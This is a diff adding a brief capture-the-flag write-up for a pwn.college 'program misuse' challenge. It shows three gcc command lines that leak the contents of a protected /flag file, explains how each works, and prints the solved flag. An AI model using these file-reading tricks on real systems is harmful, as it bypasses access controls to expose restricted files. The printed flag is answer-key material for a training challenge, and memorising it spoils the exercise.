@@ -1,0 +1,39 @@
+# challenge: gcc
+
+📅 2025-12-21
+📁 program misuse
+
+---
+
+## ✅ what i did 
+I WAY
+-clicked start
+-opened the terminal
+-ran: 'vim bro.c'
+-typed: '#include </flag>'
+        'int main(void){'
+              'puts("ciao");'
+        '}'
+-ran: 'gcc -o bro bro.c'
+-flag popped out
+
+II WAY
+-clicked start
+-opened the terminal
+-ran: 'gcc @/flag'
+-flag popped out
+
+III WAY
+-clicked start
+-opened the terminal
+-ran: 'gcc -x c -E "/flag"'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+gcc is a compiler 
+I WAY -> when u include a file as libc gcc try to read it. in this case it leaks its content
+II WAY -> @FILE says to gcc to read file's options and arguments
+III WAY -> -x c tells gcc to take the file as .c extension. -E do not compile, just print its content
+
+## 🏁 Flag  
+pwn.college{gcWQK3ga-XfbHfwI-4DVVSCRRN9.dBTOxwCO4IDOxEzW}
